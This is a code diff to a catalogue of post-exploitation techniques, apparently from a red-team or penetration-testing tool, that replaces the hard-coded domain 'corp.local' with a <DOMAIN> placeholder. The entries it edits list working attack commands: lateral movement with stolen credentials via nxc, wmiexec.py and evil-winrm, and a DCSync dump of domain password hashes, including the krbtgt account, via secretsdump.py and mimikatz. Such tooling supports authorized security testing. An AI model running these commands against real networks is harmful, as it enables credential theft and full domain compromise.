@@ -25,7 +25,7 @@ POSTEX_TECHNIQUES: dict[str, PostexTechnique] = {
         summary="Use compromised creds for SMB/WinRM/RDP to admin-accessible hosts.",
         manual_commands=(
             "nxc smb <host> -u user -p pass -x whoami",
-            "wmiexec.py corp.local/user:pass@<host>",
+            "wmiexec.py <DOMAIN>/user:pass@<host>",
             "evil-winrm -i <host> -u user -p pass",
         ),
     ),
@@ -72,8 +72,8 @@ POSTEX_TECHNIQUES: dict[str, PostexTechnique] = {
         mitre_id="T1003.006",
         summary="Replicate domain password hashes via DRSUAPI.",
         manual_commands=(
-            "secretsdump.py corp.local/user:pass@<DC> -just-dc",
-            "mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt",
+            "secretsdump.py <DOMAIN>/user:pass@<DC> -just-dc",
+            "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt",
         ),
     ),
     "dpapi": PostexTechnique(
